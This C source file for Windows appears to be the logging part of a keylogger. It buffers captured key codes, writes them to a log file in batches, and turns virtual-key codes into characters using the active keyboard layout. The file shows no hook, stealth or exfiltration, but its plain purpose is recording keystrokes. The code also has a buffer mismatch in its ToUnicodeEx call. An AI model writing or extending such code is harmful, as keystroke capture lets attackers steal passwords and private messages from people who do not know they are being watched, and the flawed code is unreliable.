#include <stdio.h>
#include <windows.h>
#include "logger.h"
#include <malloc.h>
#include <time.h>

logger *_pLooger;

// Function to set the callback function pointer
void setOnConditionCallback(onConditionCallback _onConditionCallback)
{
    _pLooger->m_pOnConditionCallback = _onConditionCallback;
}

int isPrintable(char symbol)
{
    // ASCII printable characters range from 32 to 126
    return (symbol >= 32 && symbol <= 126);
}

HRESULT createLogger(const char *filename)
{
    _pLooger = (logger *)malloc(sizeof(logger));
    if (_pLooger == NULL)
    {
        DLogError("Failed to allocate memory for _pLooger");
        return S_FALSE;
    }

    _pLooger->filename = filename;
    _pLooger->file = fopen(filename, "a");

    if (_pLooger->file == NULL)
    {
        DLogError("Failed to open log file");
        free(_pLooger);
        return S_FALSE;
    }

    _pLooger->currentIndex = 0;
    return S_OK;
}

// Function to log messages
void logMessage(const char *message)
{
    if (_pLooger == NULL || _pLooger->file == NULL)
    {
        DLogError("Logger not initialized.\n");
        return;
    }

    _pLooger->inputKeyCodes[_pLooger->currentIndex] = *message;
    _pLooger->currentIndex += 1;

    if (_pLooger->m_pOnConditionCallback)
        _pLooger->m_pOnConditionCallback(NULL);

    if (_pLooger->currentIndex == MAX_INPUTS / 4)
    {
        fwrite(_pLooger->inputKeyCodes, sizeof(char), _pLooger->currentIndex, _pLooger->file);
        fwrite("\n", sizeof(char), 1, _pLooger->file);
        fflush(_pLooger->file);

        // Won't overwrite already saved charactes in the array, only index
        // zeroing is needed tbh
        _pLooger->currentIndex = 0;
    }
}

void closeLogger()
{
    if (_pLooger != NULL)
    {
        if (_pLooger->file != NULL)
        {
            fclose(_pLooger->file);
        }
        free(_pLooger);
    }
}

char getKeyboardSymbol(int vkCode)
{
    char symbol[2] = {0};

    HKL hkl = GetKeyboardLayout(0);

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, (LPWSTR)symbol, sizeof(symbol) / sizeof(symbol[0]), 0, hkl);
    if (result > 0)
    {
        return symbol[0];
    }
    else
    {
        return '\0';
    }
}
